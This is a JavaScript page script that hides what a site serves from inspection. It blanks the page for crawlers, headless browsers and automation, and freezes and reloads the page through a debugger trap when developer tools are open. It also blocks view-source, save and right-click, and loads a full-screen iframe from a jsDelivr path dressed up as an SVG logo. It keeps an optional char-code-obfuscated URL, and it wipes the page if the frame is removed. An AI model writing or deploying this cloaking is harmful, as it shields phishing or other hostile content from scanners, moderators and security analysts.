(function () {
  'use strict';

  // =========================================================================
  // CONFIGURATION: TARGET URL SELECTION
  // =========================================================================
  const CONFIG = {
    USE_ENCODED_URL: false,
    DIRECT_URL: 'https://cdn.jsdelivr.net/gh/lucideproxy/svg@latest/logo.svg#/',
    ENCODED_URL_CODES: [
      104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109
    ]
  };

  const getTargetUrl = () => {
    if (CONFIG.USE_ENCODED_URL) {
      return String.fromCharCode.apply(null, CONFIG.ENCODED_URL_CODES);
    }
    return CONFIG.DIRECT_URL;
  };

  // =========================================================================
  // 1. SCRAPER & BOT DETECTOR
  // =========================================================================
  const isAutomated = () => {
    const ua = navigator.userAgent.toLowerCase();
    if (/bot|googlebot|crawler|spider|robot|crawling|slurp|bingbot|yandex|baidu|headless|phantom|selenium|puppeteer/i.test(ua)) {
      return true;
    }
    if (navigator.webdriver || !!window.callPhantom || !!window._phantom || !!window.__nightmare) {
      return true;
    }
    if (!navigator.languages || navigator.languages.length === 0) {
      return true;
    }
    return false;
  };

  if (isAutomated()) {
    document.documentElement.innerHTML = '';
    return;
  }

  // =========================================================================
  // 2. DEVTOOLS INTERFERENCE TRAP
  // =========================================================================
  const startDevToolsBlocker = () => {
    const freeze = () => {
      const startTime = performance.now();
      (function () {}.constructor('debugger')());
      const endTime = performance.now();
      if (endTime - startTime > 100) {
        document.body.innerHTML = '';
        window.location.reload();
      }
    };
    setInterval(freeze, 200);
  };

  // =========================================================================
  // 3. UI INTERACTION LOCKOUT & POPUP INTERCEPTION
  // =========================================================================
  const lockInteractions = () => {
    // Prevent common DevTools / View Source shortcuts
    window.addEventListener(
      'keydown',
      (e) => {
        if (e.keyCode === 123) e.preventDefault();
        if (e.ctrlKey || e.metaKey) {
          const key = e.key.toLowerCase();
          if (key === 'u' || key === 's' || key === 'i' || key === 'j' || key === 'c') {
            e.preventDefault();
            e.stopPropagation();
          }
        }
      },
      true
    );

    window.addEventListener('contextmenu', (e) => e.preventDefault(), true);

    // Intercept programmatic window.open calls on the root context
    window.open = function () {
      return null;
    };
  };

  // =========================================================================
  // 4. MAIN EMBEDDED IFRAME CONSTRUCTOR (RESTRICTED SANDBOX)
  // =========================================================================
  const buildSecureFrame = () => {
    const iframe = document.createElement('iframe');
    iframe.src = getTargetUrl();

    Object.assign(iframe.style, {
      position: 'fixed',
      top: '0px',
      left: '0px',
      width: '100vw',
      height: '100vh',
      border: 'none',
      outline: 'none',
      zIndex: '2147483647',
      background: '#000'
    });

    iframe.setAttribute('allowfullscreen', 'true');
    iframe.setAttribute('webkitallowfullscreen', 'true');
    iframe.setAttribute('mozallowfullscreen', 'true');

    // Minimal operational permissions - blocked camera, microphone, geolocation
    iframe.setAttribute('allow', 'fullscreen; autoplay; encrypted-media; picture-in-picture');

    // RESTRICTED SANDBOX:
    // Omitted 'allow-popups' and 'allow-popups-to-escape-sandbox' to prevent opening new tabs.
    // Omitted 'allow-top-navigation' and 'allow-top-navigation-by-user-activation' to prevent redirecting host window.
    iframe.setAttribute(
      'sandbox',
      'allow-scripts allow-same-origin allow-forms allow-modals allow-downloads allow-orientation-lock allow-pointer-lock allow-presentation'
    );

    return iframe;
  };

  // =========================================================================
  // 5. DOM TAMPER OBSERVER
  // =========================================================================
  const attachTamperObserver = (targetNode) => {
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList') {
          const removed = Array.from(mutation.removedNodes);
          if (removed.includes(targetNode)) {
            document.documentElement.innerHTML = '';
          }
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });
  };

  // =========================================================================
  // 6. INITIALIZATION
  // =========================================================================
  const init = () => {
    lockInteractions();
    startDevToolsBlocker();

    // Render the visible embed iframe
    const frame = buildSecureFrame();
    document.body.appendChild(frame);
    attachTamperObserver(frame);
  };

  if (document.body) {
    init();
  } else {
    document.addEventListener('DOMContentLoaded', init);
  }
})();
